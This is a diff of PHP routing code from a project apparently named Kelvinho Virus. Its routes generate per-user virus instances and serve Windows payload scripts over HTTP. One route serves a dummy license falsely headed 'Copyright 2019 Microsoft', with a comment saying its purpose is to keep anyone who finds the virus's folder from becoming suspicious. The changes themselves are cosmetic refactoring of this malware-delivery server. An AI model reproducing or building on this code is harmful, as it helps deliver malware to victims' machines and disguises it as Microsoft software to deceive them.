@@ -7,25 +7,18 @@ use Kelvinho\Virus\Singleton\Header;
 global $requestData, $userFactory, $virusFactory, $router;
 
 $router->get("new/*", function () use ($requestData, $userFactory, $virusFactory) {
-    $user_handle = $requestData->getExplodedPath()[1];
-    if (!$userFactory->exists($user_handle)) Header::notFound();
+    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[1])) Header::notFound();
     if ($userFactory->get($user_handle)->isHold()) Header::notFound();
-    $virus = $virusFactory->new($user_handle);
-    echo Windows::initStandalone($virus->getVirusId(), $user_handle);
-    Header::ok();
+    echo Windows::initStandalone(($virus = $virusFactory->new($user_handle))->getVirusId(), $user_handle);
 });
 $router->get("new/win/*/entry/*", function () use ($requestData, $userFactory) {
-    $user_handle = $requestData->getExplodedPath()[2];
-    if (!$userFactory->exists($user_handle)) Header::notFound();
+    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[2])) Header::notFound();
     if ($userFactory->get($user_handle)->isHold()) Header::notFound();
-    $virus_id = $requestData->getExplodedPath()[4];
-    echo Windows::simpleMain($virus_id);
-    Header::ok();
+    echo Windows::simpleMain($virus_id = $requestData->getExplodedPath()[4]);
 });
 //Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
 $router->get("new/win/*/license", function () use ($requestData, $userFactory) {
-    $user_handle = $requestData->getExplodedPath()[2];
-    if (!$userFactory->exists($user_handle)) Header::notFound();
+    if (!$userFactory->exists($user_handle = $requestData->getExplodedPath()[2])) Header::notFound();
     if ($userFactory->get($user_handle)->isHold()) Header::notFound(); //@formatter:off ?>
 Copyright 2019 Microsoft
 
